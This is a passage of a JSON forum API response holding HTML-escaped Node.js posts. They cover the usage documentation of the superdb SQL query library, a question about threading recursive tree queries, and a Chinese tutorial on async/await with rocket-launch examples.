SELECT * FROM tb_example WHERE id = 333 AND name = &#x27;superdb&#x27; \n&#x2F;&#x2F;  SELECT COUNT(*) AS COUNT FROM tb_example WHERE id = 333 AND name = &#x27;superdb&#x27;\n</code></pre><h4>count</h4>\n<pre class=\"prettyprint language-js\"><code>await conn.count(tbName, findOptions);\n\nconst result = await conn.count(&#x27;tb_example&#x27;, {\n    where: {\n      id: 333,\n      name: &#x27;superdb&#x27;,\n    },\n  });\n&#x2F;&#x2F; SELECT COUNT(*) AS COUNT FROM tb_example WHERE id = 333 AND name = &#x27;superdb&#x27;\n</code></pre><h4>create</h4>\n<pre class=\"prettyprint language-js\"><code>await conn.create(tbName, createParams);\n\nconst result = await conn.create(&#x27;tb_example&#x27;, [{ id: 100, name: &#x27;qt&#x27; }, { id: 101, name: &#x27;ds&#x27; }]);\n&#x2F;&#x2F; INSERT INTO tb_example (id,name) values (100, &#x27;qt&#x27;), (101, &#x27;ds&#x27;)\n</code></pre><h4>update</h4>\n<pre class=\"prettyprint language-js\"><code>await conn.update(tbName, updateOptions, findOptions);\n\nconst result = await conn.update(&#x27;tb_example&#x27;, { name: &#x27;qtds&#x27; }, {\n    where: { id: 100 },\n  });\n&#x2F;&#x2F; UPDATE tb_example SET name = &#x27;qtds&#x27; WHERE id = 100\n</code></pre><h4>delete</h4>\n<pre class=\"prettyprint language-js\"><code>await conn.delete(tbName, deleteOptions)\n\nconst result = await conn.delete(&#x27;tb_example&#x27;, {\n    where: { id: 100 },\n    limit: 1,\n  });\n&#x2F;&#x2F; DELETE FROM tb_example WHERE id = 100 LIMIT 1\n</code></pre><h3>findOptions</h3>\n<pre class=\"prettyprint language-js\"><code>findOptions = {\n    table: undefined,   &#x2F;&#x2F; eg: [&#x27;tb_example&#x27;]\n    select: [],         &#x2F;&#x2F; eg: [&#x27;id&#x27;, &#x27;name&#x27;]\n    join: [],           &#x2F;&#x2F; eg: [{table: &#x27;tb_user&#x27;, on: &#x27;tb_user.id = tb_example.id&#x27;}]\n    where: {},          &#x2F;&#x2F; eg: {name: &#x27;superdb&#x27;}\n    group: [],          &#x2F;&#x2F; eg: [&#x27;name desc&#x27;]\n    having: [],         &#x2F;&#x2F; eg: [&#x27;count &gt; 4&#x27;]\n    order: [],          &#x2F;&#x2F; eg: [&#x27;id desc&#x27;, &#x27;name asc&#x27;]\n    limit: undefined,   &#x2F;&#x2F; eg: 1\n    offset: undefined,  &#x2F;&#x2F; eg: 1\n    logging: false,     &#x2F;&#x2F; eg: true\n    ttl: 0,             &#x2F;&#x2F; eg: if open cache, then this ttl have Higher priority than global ttl;  if set &lt;=0, then not cache this find\n}\n</code></pre><h3>Chain methods</h3>\n<h4>table(params.table)</h4>\n<pre class=\"prettyprint language-js\"><code>conn.table(&#x27;tb_example&#x27;)\nconn.table([&#x27;tb_example&#x27;])\n\nconn.table(&#x27;tb_example as exp&#x27;)\nconn.table([&#x27;tb_example&#x27;, &#x27;exp&#x27;])\n\n  const result = await conn\n    .find([&#x27;tb_example&#x27;,&#x27;exp&#x27;]);\n&#x2F;&#x2F;  SELECT * FROM tb_example AS exp\n</code></pre><h4>select(params.select)</h4>\n<pre class=\"prettyprint language-js\"><code>conn.select(&#x27;id, name&#x27;) \nconn.select([&#x27;id&#x27;, &#x27;name&#x27;])\n\nconst result = await conn\n    .select([&#x27;id&#x27;, &#x27;name&#x27;])\n    .find([&#x27;tb_example&#x27;,&#x27;exp&#x27;]);\n&#x2F;&#x2F; SELECT id, name FROM tb_example AS exp\n</code></pre><h4>updateBody(params.updateBody)</h4>\n<pre class=\"prettyprint language-js\"><code>conn.updateBody({name:&#x27;superdb&#x27;})\n\nconst result = await conn\n    .updateBody({ name: &#x27;superdb&#x27; })\n    .where({ name: &#x27;oldName&#x27; })\n    .limit(1)\n    .update(&#x27;tb_example&#x27;);\n&#x2F;&#x2F; UPDATE tb_example SET name = &#x27;superdb&#x27; WHERE name = &#x27;oldName&#x27; LIMIT 1\n</code></pre><h4>insertBody(params.insertBody)</h4>\n<blockquote>\n<p>参数为数组，则代表插入多条</p>\n</blockquote>\n<pre class=\"prettyprint language-js\"><code>conn.insertBody({id: 100, name: &#x27;alldb&#x27;})\nconn.insertBody([{id: 100, name: &#x27;alldb&#x27;}])\n\nconst result = await conn\n    .insertBody([{ id: 100, name: &#x27;alldb100&#x27; }, { id: 101, name: &#x27;alldb101&#x27; }])\n    .create(&#x27;tb_example&#x27;);\n&#x2F;&#x2F; INSERT INTO tb_example (id,name) values (100, &#x27;alldb100&#x27;), (101, &#x27;alldb101&#x27;)\n</code></pre><h4>where(params.where)</h4>\n<blockquote>\n<p>more detail where, please enter <a href=\"#op\">op</a></p>\n</blockquote>\n<pre class=\"prettyprint language-js\"><code>conn.where({id: 5})\n\nconst result = await conn\n    .where({ id: 5 })\n    .find(&#x27;tb_example&#x27;);\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE id = 5\n</code></pre><h4>join(params.join)</h4>\n<pre class=\"prettyprint language-js\"><code>  const result = await conn\n    .join([{\n      table: &#x27;tb_user as User&#x27;,\n      on: &#x27;User.id = tb_example.id&#x27;,\n      direction: &#x27;left&#x27;,\n    }])\n    .find(&#x27;tb_example&#x27;);  \n&#x2F;&#x2F; SELECT * FROM tb_example left JOIN tb_user as User ON User.id = tb_example.id\n</code></pre><h4>limit(params.limit)</h4>\n<pre class=\"prettyprint language-js\"><code>conn.limit(10) &#x2F;&#x2F; limit 10\nconn.limit([10, 1]) &#x2F;&#x2F; limit 10 offset 1\n\nconst result = await conn\n    .limit([10, 1])\n    .find(&#x27;tb_example&#x27;);\n&#x2F;&#x2F; SELECT * FROM tb_example LIMIT 10 OFFSET 1\n</code></pre><h4>offset(params.offset)</h4>\n<pre class=\"prettyprint language-js\"><code>conn.offset(1) &#x2F;&#x2F; offset 1\n\nconst result = await conn\n    .limit(1)\n    .offset(1)\n    .find(&#x27;tb_example&#x27;);\n&#x2F;&#x2F; SELECT * FROM tb_example LIMIT 1 OFFSET 1 \n</code></pre><h4>order(params.order)</h4>\n<pre class=\"prettyprint language-js\"><code>conn.order(&#x27;id desc&#x27;)\nconn.order([&#x27;id desc&#x27;]) &#x2F;&#x2F; ORDER BY id desc\n\nconst result = await conn\n    .order([&#x27;id desc&#x27;, &#x27;name asc&#x27;])\n    .find(&#x27;tb_example&#x27;);\n&#x2F;&#x2F; SELECT * FROM tb_example ORDER BY id desc, name asc\n</code></pre><h4>group(params.group)</h4>\n<pre class=\"prettyprint language-js\"><code>conn.group(&#x27;name desc&#x27;)\nconn.group([&#x27;name desc&#x27;]) &#x2F;&#x2F; GROUP BY name desc\n\nconst result = await conn\n    .select(&#x27;name&#x27;)\n    .group([&#x27;name desc&#x27;])\n    .find(&#x27;tb_example&#x27;);\n&#x2F;&#x2F; SELECT name FROM tb_example GROUP BY name desc\n</code></pre><h4>having(params.having)</h4>\n<pre class=\"prettyprint language-js\"><code>conn.having(&#x27;count &gt; 4&#x27;)\nconn.having([&#x27;count &gt; 4&#x27;]) &#x2F;&#x2F; HAVING count &gt; 4\n\nconst result = await conn\n    .select([&#x27;count(*) as count&#x27;, &#x27;name&#x27;])\n    .group([&#x27;name desc&#x27;])\n    .having([&#x27;count &gt; 4&#x27;])\n    .find(&#x27;tb_example&#x27;);\n&#x2F;&#x2F; SELECT count(*) as count, name FROM tb_example GROUP BY name desc HAVING count &gt; 4\n</code></pre><h4>logging(params.logging);</h4>\n<pre class=\"prettyprint language-js\"><code>conn.logging(true) &#x2F;&#x2F; print superdb sql \nconn.logging(false) &#x2F;&#x2F; not print superdb sql\n</code></pre><h4>ttl(params.ttl)</h4>\n<pre class=\"prettyprint language-js\"><code>conn.ttl(60 * 5)  &#x2F;&#x2F; redis cache ex = 60 * 5\n</code></pre><h3>Op</h3>\n<blockquote>\n<p>Op = conn.op; 用来提供一系列where查询的方法集</p>\n</blockquote>\n<h4>Op.or</h4>\n<pre class=\"prettyprint language-js\"><code>  const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      [conn.Op.or]: {\n        id: 6,\n        name: &#x27;superdb&#x27;,\n      },\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE (id = 6 OR name = &#x27;superdb&#x27;)\n</code></pre><h4>OP.and</h4>\n<h4>Op.literal</h4>\n<blockquote>\n<p>literal is unrelated with where.key ,just depends on where.value</p>\n</blockquote>\n<pre class=\"prettyprint language-js\"><code>  const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      &#x27;random&#x27;: conn.Op.literal(&#x27;id IS NULL&#x27;),\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE id IS NULL\n</code></pre><h4>Op.eq</h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.eq(&#x27;superdb&#x27;),\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name = &#x27;superdb&#x27;\n</code></pre><h4><a href=\"http://Op.ne\">Op.ne</a></h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.ne(&#x27;superdb&#x27;),\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name != &#x27;superdb&#x27;\n</code></pre><h4>Op.gte</h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.gte(&#x27;d&#x27;),\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name &gt;= &#x27;d&#x27;\n</code></pre><h4><a href=\"http://Op.gt\">Op.gt</a></h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.gt(&#x27;d&#x27;)\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name &gt; &#x27;d&#x27; \n</code></pre><h4>Op.lte</h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.lte(&#x27;d&#x27;),\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name &lt;= &#x27;d&#x27;\n</code></pre><h4><a href=\"http://Op.lt\">Op.lt</a></h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.lt(&#x27;d&#x27;),\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name &lt; &#x27;d&#x27;\n</code></pre><h4><a href=\"http://Op.is\">Op.is</a></h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.is(null),\n    },\n  });\n&#x2F;&#x2F;  SELECT * FROM tb_example WHERE name IS null\n</code></pre><h4>Op.not</h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.not(null)\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name IS NOT null\n</code></pre><h4><a href=\"http://Op.in\">Op.in</a></h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.in([&#x27;qtds&#x27;, &#x27;superdb&#x27;])\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name IN (&#x27;qtds&#x27;, &#x27;superdb&#x27;)\n</code></pre><h4>Op.notIn</h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.notIn([&#x27;qtds&#x27;, &#x27;superdb&#x27;])\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name NOT IN (&#x27;qtds&#x27;, &#x27;superdb&#x27;)\n</code></pre><h4>Op.like</h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.like(&#x27;%d&#x27;),\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name LIKE &#x27;%d&#x27;\n</code></pre><h4>Op.notLike</h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.notLike(&#x27;%d&#x27;),\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name NOT LIKE &#x27;%d&#x27;\n</code></pre><h4>Op.between</h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.between([&#x27;c&#x27;, &#x27;f&#x27;])\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name BETWEEN &#x27;c&#x27; AND &#x27;f&#x27;\n</code></pre><h4>Op.notBetween</h4>\n<pre class=\"prettyprint language-js\"><code>const result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      name: conn.Op.notBetween([&#x27;c&#x27;, &#x27;f&#x27;]),\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE name NOT BETWEEN &#x27;c&#x27; AND &#x27;f&#x27;\n</code></pre></div>","title":"分享一个非orm模型的sql查询库","last_reply_at":"2018-12-20T15:50:41.460Z","good":false,"top":false,"reply_count":8,"visit_count":1174,"create_at":"2018-12-11T06:33:27.661Z","author":{"loginname":"yujintang","avatar_url":"https://avatars3.githubusercontent.com/u/18202085?v=4&s=120"}},{"id":"5c1b682676c4964062a1be89","author_id":"5bf3cec8e6481c5709f5d871","tab":"ask","content":"<div class=\"markdown-text\"><p>给出一个父节点，在数据库查询出6个子节点。然后每个节点下面又会有很多的节点。\n目前方法：\n\t\t根据父节点查询出N个子节点，然后遍历调用递归函数查询出子节点下面的所有子节点，一直递归，知道最后没有，最后综合数据返回\n\t\t速率有点慢，还影响其他接口调用。也许数据太多\n想到改进的方法：\n\t根据父节点查询出N个子节点，然后遍历开启线程（使用threads-a-gogo模块）去自己递归查询出所有子节点，最后综合数据返回。\n\t这样是否效率会更好提升</p>\n</div>","title":"递归多叉树下面如何开启线程帮忙做运算与io操作！","last_reply_at":"2018-12-20T11:10:58.197Z","good":false,"top":false,"reply_count":4,"visit_count":596,"create_at":"2018-12-20T10:00:06.937Z","author":{"loginname":"tzbcf","avatar_url":"https://avatars1.githubusercontent.com/u/25059314?v=4&s=120"}},{"id":"5c1b6ea23898674067a7688e","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>本篇文章，小编将和大家一起学习异步编程的未来——<strong>async/await</strong>，它会打破你对上篇文章<strong>Promise</strong>的认知，竟然异步代码还能这么写! 但是别太得意，你需要深入理解<strong>Promise</strong>后，才能更好的的驾驭<strong>async/await</strong>，因为<strong>async/await</strong>是基于<strong>Promise</strong>的。</p>\n<h1>关于async / await</h1>\n<ol>\n<li>用于编写异步程序</li>\n<li>代码书写方式和同步编码十分相似，因此代码十分简洁易读</li>\n<li>基于<strong>Promise</strong></li>\n<li>您可以使用try-catch常规的方法捕获异常</li>\n<li>ES8中引入了<strong>async/await</strong>，目前几乎所有的现代浏览器都已支持这个特性（除了IE和Opera不支持）</li>\n<li>你可以轻松设置断点，调试更容易。</li>\n</ol>\n<h1>从async开始学起</h1>\n<p>让我们从<strong>async</strong>关键字开始吧，这个关键字可以放在函数之前，如下所示：</p>\n<pre class=\"prettyprint language-js\"><code>async function f() { \n return 1; \n}\n</code></pre><p>在函数之间加上<strong>async</strong>意味着：函数将返回一个<strong>Promise</strong>,虽然你的代码里没有显示的声明返回一个<strong>Promise</strong>,但是编译器会自动将其转换成一个<strong>Promise</strong>，不信你可以使用<strong>Promise</strong>的<strong>then</strong>方法试试：</p>\n<pre class=\"prettyprint language-js\"><code>async function f() { \n return 1; \n} \nf().then(alert); &#x2F;&#x2F; 1\n</code></pre><p>…如果你不放心的话，你可以在代码里明确返回一个<strong>Promise</strong>,输出结果是相同的。</p>\n<pre class=\"prettyprint language-js\"><code>async function f() { \n return Promise.resolve(1); \n} \nf().then(alert); &#x2F;&#x2F; 1\n</code></pre><p>很简单吧，小编之所以说 <strong>async/await</strong> 是基于Promise是没毛病的，<strong>async</strong>函数返回一个<strong>Promise</strong>，很简单吧，不仅如此，还有一个关键字<strong>await</strong>,<strong>await</strong>只能在<strong>async</strong>中运行。</p>\n<h1>等待——await</h1>\n<p><strong>await的基本语法：</strong></p>\n<pre class=\"prettyprint language-js\"><code>let value=await promise;\n</code></pre><p>该关键字的await的意思就是让JS编译器等待Promise并返回结果。接下来我们看一段简单的示例：</p>\n<pre class=\"prettyprint language-js\"><code>async function f() { \n let promise = new Promise((resolve, reject) =&gt; { \n setTimeout(() =&gt; resolve(&quot;done!&quot;), 1000) \n }); \n let result = await promise; &#x2F;&#x2F; wait till the promise resolves (*) \n alert(result); &#x2F;&#x2F; &quot;done!&quot; \n} \nf();\n</code></pre><p>函数执行将会在 let result = await promise 这一行暂停，直到Promise返回结果，因此上述代码将会1秒后，在浏览器弹出“done”的提示框。</p>\n<p>小编在此强调下：</p>\n<ul>\n<li>await的字面意思就是让JavaScript等到Promise结束，然后输出结果。这里并不会占用CPU资源，因为引擎可以同时执行其他任务：其他脚本或处理事件。</li>\n<li>不能单独使用await，必须在async函数作用域下使用，否则将会报出异常“Error: await is only valid in async function”，示例代码如下：</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>function f() { \n let promise = Promise.resolve(1); \n let result = await promise; &#x2F;&#x2F; Syntax error \n}\n</code></pre><h1>接下来，小编将和大家一起来亲自动手实践以下内容：</h1>\n<ul>\n<li>async与Promise.then的结合,依次处理多个结果</li>\n<li>使用await替代Promise.then，依次处理多个结果</li>\n<li>同时等待多个结果</li>\n<li>使用Promise.all收集多个结果</li>\n<li>使用try-catch捕获异常</li>\n<li>如何捕获Promise.all中的异常</li>\n<li>使用finally确保函数执行</li>\n</ul>\n<p>一起动手之前，确保你安装了Node,NPM相关工具，谷歌浏览器，为了预览代码效果，小编使用 <strong>npm install http-server -g</strong> 命令快速部署了web服务环境，方便我们运行代码。接下来，我们写一个火箭发射场景的小例子（不是真的发射火箭😆）。</p>\n<h2><strong>async与Promise.then的结合,依次处理多个结果</strong></h2>\n<ul>\n<li>通过控制台命令切换至工作区</li>\n<li>创建一个async-function-Promise-chain的文件夹</li>\n<li>在main.js中用创建一个返回随机函数的async函数getRandomNumber：</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>async function getRandomNumber() { \n console.log(&#x27;Getting random number.&#x27;); \n return Math.random(); \n} \n</code></pre><ul>\n<li>再创建一个async函数determinReadyToLaunch：如果传入参数大于0.5将返回True</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>async function deteremineReadyToLaunch(percentage) { \n console.log(&#x27;Determining Ready to launch.&#x27;); \n return percentage&gt;0.5; \n} \n</code></pre><ul>\n<li>创建第三个async函数reportResults，如果传入参数为True将进入倒计时发射</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>async function reportResults(isReadyToLaunch) { \n if (isReadyToLaunch) { \n console.log(&#x27;Rocket ready to launch. Initiate countdown: 🚀&#x27;); \n } else { \n console.error(&#x27;Rocket not ready. Abort mission: &#x27;); \n } \n} \n</code></pre><ul>\n<li>创建一个main函数，调用getRandomNumber函数，并且通过Promise.then方法相继调用determineReadyToLaunch和reportResults函数</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>export function main() { \n console.log(&#x27;Before Promise created&#x27;); \n getRandomNumber() \n .then(deteremineReadyToLaunch) \n .then(reportResults) \n console.log(&#x27;After Promise created&#x27;); \n} \n</code></pre><ul>\n<li>新建一个html文件引入main.js</li>\n</ul>\n<pre class=\"prettyprint language-html\"><code>&lt;html&gt; \n&lt;script type=&quot;module&quot;&gt; \n import {main} from &#x27;.&#x2F;main.js&#x27;; \n main(); \n&lt;&#x2F;script&gt; \n&lt;body&gt; \n&lt;&#x2F;body&gt; \n&lt;&#x2F;html&gt;\n</code></pre><ul>\n<li>在工作区域运行 http-server 命令，你将会看到如下输出</li>\n</ul>\n<p><img src=\"https://ask.qcloudimg.com/draft/1036137/oajrq6suv7.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<h2>使用await替代Promise.then，依次处理多个结果</h2>\n<p>上一小节，我们使用Promise.then依次处理了多个结果，本小节，小编将使用await实现同样的功能，具体操作如下：</p>\n<ul>\n<li>通过控制台命令切换至工作区</li>\n<li>创建一个async-function-Promise-chain的文件夹</li>\n<li>在main.js中用创建一个返回随机函数的async函数getRandomNumber：</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>async function getRandomNumber() { \n console.log(&#x27;Getting random number.&#x27;); \n return Math.random(); \n} \n</code></pre><ul>\n<li>再创建一个async函数determinReadyToLaunch：如果传入参数大于0.5将返回True</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>async function deteremineReadyToLaunch(percentage) { \n console.log(&#x27;Determining Ready to launch.&#x27;); \n return percentage&gt;0.5; \n} \n</code></pre><ul>\n<li>创建第三个async函数reportResults，如果传入参数为True将进入倒计时发射</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>async function reportResults(isReadyToLaunch) { \n if (isReadyToLaunch) { \n console.log(&#x27;Rocket ready to launch. Initiate countdown: 🚀&#x27;); \n } else { \n console.error(&#x27;Rocket not ready. Abort mission: &#x27;); \n } \n} \n</code></pre><ul>\n<li>创建一个main函数，调用getRandomNumber函数，并且通过Promise.then方法相继调用determineReadyToLaunch和reportResults函数</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>export async function main() { \n const randomNumber = await getRandomNumber(); \n const ready = await deteremineReadyToLaunch(randomNumber); \n await reportResults(ready); \n} \n</code></pre><ul>\n<li>在工作区域运行 http-server 命令，你将会看到如下输出</li>\n</ul>\n<p><img src=\"https://ask.qcloudimg.com/draft/1036137/givzmy1jn6.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<h2>同时等待多个结果</h2>\n<p>有时候我们需要同时启动多个异步，无需依次等待结果消耗时间，接下来的例子可以使用await同时启动多个异步函数，等待多个结果。</p>\n<ul>\n<li>通过控制台命令切换至工作区</li>\n<li>创建一个await-concurrently的文件夹</li>\n<li>创建三个函数checkEngines，checkFlightPlan，和checkNavigationSystem用来记录信息时，这三个函数都返回一个Promise，示例代码如下：</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>function checkEngines() { \n console.log(&#x27;checking engine&#x27;); \n return new Promise(function (resolve) { \n setTimeout(function() { \n  console.log(&#x27;engine check completed&#x27;); \n  resolve(Math.random() &lt; 0.9) \n }, 250) \n }); \n} \nfunction checkFlightPlan() { \n console.log(&#x27;checking flight plan&#x27;); \n return new Promise(function (resolve) { \n setTimeout(function() { \n  console.log(&#x27;flight plan check completed&#x27;); \n  resolve(Math.random() &lt; 0.9) \n }, 350) \n }); \n} \nfunction checkNavigationSystem() { \n console.log(&#x27;checking navigation system&#x27;); \n return new Promise(function (resolve) { \n setTimeout(function() { \n  console.log(&#x27;navigation system check completed&#x27;); \n  resolve(Math.random() &lt; 0.9) \n }, 450) \n }); \n} \n</code></pre><ul>\n<li>创建一个async的main函数调用上一步创建函数。将每个返回的值分配给局部变量。然后等待Promise的结果，并输出结果：</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code> export async function main() { \n const enginePromise = checkEngines(); \n const flighPlanPromise = checkFlightPlan(); \n const navSystemPromise = checkNavigationSystem(); \n const enginesOk = await enginePromise; \n const flighPlanOk = await flighPlanPromise; \n const navigationOk = await navSystemPromise; \n if (enginesOk &amp;&amp; flighPlanOk &amp;&amp; navigationOk) { \n console.log(&#x27;All systems go, ready to launch:  🚀&#x27;); \n } else { \n console.error(&#x27;Abort the launch: &#x27;); \n if (!enginesOk) { \n  console.error(&#x27;engines not ready&#x27;); \n } \n if (!flighPlanOk) { \n  console.error(&#x27;error found in flight plan&#x27;); \n } \n if (!navigationOk) { \n  console.error(&#x27;error found in navigation systems&#x27;); \n } \n } \n} \n</code></pre><ul>\n<li>在工作区域运行 http-server 命令，你将会看到如下输出</li>\n</ul>\n<p><img src=\"https://ask.qcloudimg.com/draft/1036137/s7u7sf6d5g.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<h2>使用Promise.all收集多个结果</h2>\n<p>在上一小节中，我们一起学习了如何触发多个异步函数并等待多个异步函数结果。上一节我们只使用了asyc/await，本节小编和大家一起使用Promise.all来收集多个异步函数的结果，在某些情况下，尽量使用Promise相关的API，具体的代码如下：</p>\n<ul>\n<li>通过控制台命令切换至工作区</li>\n<li>创建一个Promise-all-collect-concurrently的文件夹</li>\n</ul>\n<p>创建三个函数功能checkEngines，checkFlightPlan，和checkNavigationSystem用来记录信息时，这三个函数都返回一个Promise，示例代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>function checkEngines() { \n console.log(&#x27;checking engine&#x27;); \n return new Promise(function (resolve) { \n setTimeout(function() { \n  console.log(&#x27;engine check completed&#x27;); \n  resolve(Math.random() &lt; 0.9) \n }, 250) \n }); \n} \nfunction checkFlightPlan() { \n console.log(&#x27;checking flight plan&#x27;); \n return new Promise(function (resolve) { \n setTimeout(function() { \n  console.log(&#x27;flight plan check completed&#x27;); \n  resolve(Math.random() &lt; 0.9) \n }, 350) \n }); \n} \nfunction checkNavigationSystem() { \n console.log(&#x27;checking navigation system&#x27;); \n return new Promise(function (resolve) { \n setTimeout(function() { \n  console.log(&#x27;navigation system check completed&#x27;); \n  resolve(Math.random() &lt; 0.9) \n }, 450) \n }); \n} \n</code></pre><ul>\n<li>创建一个async的main函数调用上一步创建的函数。使用Promise.all收集多个结果，将结果返回给变量，代码实现如下：</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>export async function main() { \n const prelaunchChecks = [ \n checkEngines(), \n checkFlightPlan(), \n checkNavigationSystem() \n ]; \n const checkResults = await Promise.all(prelaunchChecks); \n const readyToLaunch = checkResults.reduce((acc, curr) =&gt; acc &amp;&amp; \n curr); \n if (readyToLaunch) { \n console.log(&#x27;All systems go, ready to launch: 🚀&#x27;); \n } else { \n console.error(&#x27;Something went wrong, abort the launch: &#x27;); \n } } \n} \n</code></pre><ul>\n<li>在工作区域运行 http-server 命令，你将会看到如下输出：</li>\n</ul>\n<p><img src=\"https://ask.qcloudimg.com/draft/1036137/ihivfqk9g6.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>Promise.all接收多个promise的数组，并整体返回一个Promise,如果和上一小节的代码进行比较，代码量少了不少。</p>\n<h2>使用try-catch捕获异常</h2>\n<p>并非所有的async都能成功返回，我们需要处理程序的异常，在本小节中，你将会看到如何使用try-catch捕获async函数引发的异常,具体操作的流程如下：</p>\n<ul>\n<li>通过控制台命令切换至工作区</li>\n<li>创建一个async-errors-try-catch的文件夹</li>\n<li>创建一个抛出错误的async函数addBoosters</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>async function addBoosters() { \n throw new Error(&#x27;Unable to add Boosters&#x27;); \n} \n</code></pre><ul>\n<li>创建一个async函数，performGuidanceDiagnostic它也会抛出一个错误：</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>async function performGuidanceDiagnostic (rocket) { \n throw new Error(&#x27;Unable to finish guidance diagnostic&#x27;)); \n} \n</code></pre><ul>\n<li>创建一个async的main函数调用addBosters、performGuidanceDiagnostic两个函数 ，使用try-catch捕获异常：</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code> export async function main() { \n console.log(&#x27;Before Check&#x27;); \n try { \n await addBosters(); \n await performGuidanceDiagnostic(); \n } catch (e) { \n console.error(e); \n } \n} \nconsole.log(&#x27;After Check&#x27;); \n</code></pre><ul>\n<li>在工作区域运行 http-server 命令，你将会看到如下输出：</li>\n</ul>\n<p><img src=\"https://ask.qcloudimg.com/draft/1036137/jl9eau057h.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>从输出看出，我们使用熟悉的try-catch捕获到了异常，如果第一个发生异常，第二个就不会执行，同时将会被记录到，并输出到控制台，在下一小节，我们将一起学习如何使用try-catch捕获Promise.all中运行的多个Promise的异常。</p>\n<h2>如何捕获Promise.all中的异常</h2>\n<p>在上一小节，我们使用了Promise.all来收集多个异步函数的结果。在收集异常方面，Promise.all更有趣。通常，我们在处理多个错误时，同时显示多个错误信息，我们必须编写相关的业务逻辑。但是，在这小节，你将会使用Promise.all和try-catch捕获异常，无需编写复杂的布尔逻辑处理业务,具体如何实现示例如下：</p>\n<ul>\n<li>通过控制台命令切换至工作区</li>\n<li>创建一个Promise-all-collect-concurrently的文件夹</li>\n<li>创建三个async函数checkEngines，checkFlightPlan以及checkNavigationSystem用来记录信息时，返回Promise，一个成功的值的信息和一个失败值的信息：</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>function checkEngines() { \n  console.log(&#x27;checking engine&#x27;); \n \n  return new Promise(function (resolve, reject) { \n    setTimeout(function () { \n      if (Math.random() &gt; 0.5) { \n        reject(new Error(&#x27;Engine check failed&#x27;)); \n      } else { \n        console.log(&#x27;Engine check completed&#x27;); \n        resolve(); \n      } \n    }, 250) \n  }); \n} \n \nfunction checkFlightPlan() { \n  console.log(&#x27;checking flight plan&#x27;); \n \n  return new Promise(function (resolve, reject) { \n    setTimeout(function () { \n      if (Math.random() &gt; 0.5) { \n        reject(new Error(&#x27;Flight plan check failed&#x27;)); \n      } else { \n        console.log(&#x27;Flight plan check completed&#x27;); \n        resolve(); \n      } \n    }, 350) \n  }); \n} \n \nfunction checkNavigationSystem() { \n  console.log(&#x27;checking navigation system&#x27;); \n  return new Promise(function (resolve, reject) { \n    